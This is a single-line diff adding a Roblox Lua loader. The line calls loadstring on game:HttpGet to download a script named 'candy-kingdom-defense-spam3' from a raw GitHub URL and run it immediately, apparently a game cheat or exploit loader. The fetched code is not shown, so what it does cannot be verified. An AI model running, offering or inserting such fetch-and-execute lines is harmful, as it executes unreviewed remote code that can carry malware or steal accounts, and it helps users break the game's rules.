@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/candy-kingdom-defense-spam3-kmnt5ktqn58rqy.lua"))()
